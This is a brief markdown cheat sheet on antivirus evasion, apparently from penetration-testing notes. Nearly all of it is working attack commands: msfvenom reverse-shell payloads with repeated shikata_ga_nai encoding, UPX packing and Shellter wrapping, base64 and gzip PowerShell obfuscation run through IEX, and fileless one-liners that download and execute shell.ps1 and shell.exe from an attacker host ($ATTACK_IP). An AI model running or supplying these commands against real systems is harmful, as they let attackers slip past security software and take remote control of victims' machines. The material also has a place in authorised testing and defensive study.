# Antivirus Evasion

## Static Detection Evasion
```bash
# msfvenom encoders
msfvenom -p windows/shell_reverse_tcp LHOST=$ATTACK_IP LPORT=4444 -e x86/shikata_ga_nai -i 10 -f exe -o encoded.exe

# Custom payloads (avoid meterpreter)
msfvenom -p windows/shell_reverse_tcp LHOST=$ATTACK_IP LPORT=4444 -f exe -o shell.exe

# Payload packing (UPX)
upx -9 shell.exe

# Use Shellter (wrapper)
shellter
```

## PowerShell Obfuscation
```powershell
# Base64 encoded commands
$cmd = 'Write-Host "Hello"'
$bytes = [System.Text.Encoding]::Unicode.GetBytes($cmd)
$encoded = [Convert]::ToBase64String($bytes)
powershell -EncodedCommand $encoded

# Gzip compressed payload
$s=New-Object IO.MemoryStream(,[Convert]::FromBase64String('BASE64'));
IEX (New-Object IO.StreamReader(New-Object IO.Compression.GzipStream($s,[IO.Compression.CompressionMode]::Decompress))).ReadToEnd()
```

## In-Memory Execution (Fileless)
```powershell
IEX (New-Object Net.WebClient).DownloadString('http://$ATTACK_IP/shell.ps1')
IEX (iwr http://$ATTACK_IP/shell.ps1)

# .NET reflection
[System.Reflection.Assembly]::Load([Net.WebClient]::DownloadData('http://$ATTACK_IP/shell.exe'))
```

## C# Loaders
```csharp
// Compile: csc.exe loader.cs
// AV is less aggressive on .NET binaries
```
